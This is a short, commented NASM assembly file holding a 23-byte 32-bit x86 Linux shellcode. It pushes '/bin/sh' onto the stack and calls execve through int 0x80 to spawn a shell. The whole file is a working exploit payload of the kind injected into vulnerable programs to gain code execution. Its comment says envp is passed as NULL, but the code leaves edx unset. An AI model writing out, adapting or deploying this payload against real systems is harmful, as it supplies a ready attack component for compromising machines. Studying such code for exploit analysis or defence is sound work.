;Shellcode size : 23 bytes
global _start

_start:
    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push a NULL Byte on the stack
    
    push 0x68732f2f     
    push 0x6e69622f     ;Push /bin/sh on the stack
    mov ebx, esp        ;Intialize ebx to "/bin/sh%00"

    push eax            ;Push a NULL Byte on the stack
    push ebx            ;Push '/bin/sh%00' on the stack
    mov ecx, esp        ;Intialize ecx to "[/bin/sh%00, NULL]"

    mov al, 0xb         ;Move the systemcall number inside eax

    ;Systemcall details:
    ; --> execve("/bin/sh%00", ["/bin/sh%00", NULL], NULL)
    int 0x80            ;Execute systemcall